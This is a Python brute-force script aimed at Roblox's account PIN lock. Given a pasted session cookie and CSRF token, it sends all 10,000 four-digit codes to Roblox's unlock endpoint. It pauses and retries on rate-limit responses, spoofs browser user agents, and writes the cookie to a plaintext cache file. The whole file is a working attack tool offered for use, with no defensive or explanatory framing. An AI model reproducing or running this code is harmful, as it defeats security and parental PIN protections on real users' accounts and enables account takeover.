import requests
from requests.structures import CaseInsensitiveDict
import time
import sys
from colorama import Fore, init

init()  # Colorama initialize

# Constants
PIN_LENGTH = 4
ROBLOX_PIN_UNLOCK_URL = "https://auth.roblox.com/v1/account/pin/unlock"


def convert_pin(num):
    return f"{num:04d}"


def make_request(pin, cookie, csrf_token, user_agent):
    headers = CaseInsensitiveDict({
        "authority": "auth.roblox.com",
        "method": "POST",
        "path": "/v1/account/pin/unlock",
        "scheme": "https",
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "content-length": str(PIN_LENGTH),
        "content-type": "application/x-www-form-urlencoded",
        "cookie": cookie,
        "origin": "https://www.roblox.com",
        "referer": "https://www.roblox.com/",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": user_agent,
        "x-csrf-token": csrf_token
    })

    response = requests.post(ROBLOX_PIN_UNLOCK_URL, data={
                             "pin": pin}, headers=headers)

    if response.status_code == 429:
        print(Fore.YELLOW +
              "[!] Encountered 'Too many requests'"
              + Fore.WHITE + "\nWaiting...")
        time.sleep(5)  # Delay for 5 seconds (or other suitable delay)
        make_request(pin, cookie, csrf_token, user_agent)
    elif response.status_code == 403:
        print(f"Tried pin: {Fore.RED}{pin}{Fore.WHITE}\n-------------")
        print(
            f"""
            {Fore.RED}
            [{response.status_code}] {response.content}{Fore.WHITE}""")
    elif response.status_code == 200:
        print(f"Tried pin: {Fore.GREEN}{pin}{Fore.WHITE}\n-------------")
        print(
            f"""
            {Fore.GREEN}
            [{response.status_code}] {response.content}{Fore.WHITE}""")
        sys.exit()
    else:
        print(
            f"""
            {Fore.RED}
            [{response.status_code}] {response.content}{Fore.WHITE}""")


def main():
    print(
        Fore.YELLOW + """
        CREDITS TO SECLIST FOR 4 DIGIT CODES\nTo find your account's
        cookie and csrf token,\ncheck the README.md file in """ +
        Fore.WHITE +
        "Github"
        +
        Fore.YELLOW +
        "\nfanks," +
        Fore.RED +
        "\nlove by 0x74ngly / Tangly\n" + Fore.WHITE +
        "-------------")

    cookie = input("Enter account's cookie here: ")
    csrf_token = input("Enter csrf token here: ")

    os_choice = int(input(
        """Operating System Choices
-------------------------
+ Windows
    [1] 10 (Chrome, works with Brave)
    [2] 10 (Firefox) <-- not 100% working
    [3] 7 <-- not tested
[4] Linux <-- not tested
[5] Mac OS <-- not tested
Option: """))

    # Write cookie and os_choice to cache.txt for reuse
    with open("cache.txt", "w") as cache_file:
        cache_file.write(f"{cookie}\n{os_choice}")

    wait_time = float(input(
        "(2 is recommended) How many seconds would the brute forcer run each pin?: "))
    print("Cool, let's get this bad boy running now")

    user_agent = {
        1: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36",
        2: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0",
        3: "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
        4: "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1",
        5: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9"
    }.get(os_choice, "")  # Get corresponding user-agent based on os_choice

    codes = [convert_pin(num)
             for num in range(10000)]  # Generate all 4-digit codes

    for pin in codes:
        time.sleep(wait_time)
        make_request(pin, cookie, csrf_token, user_agent)


if __name__ == "__main__":
    main()
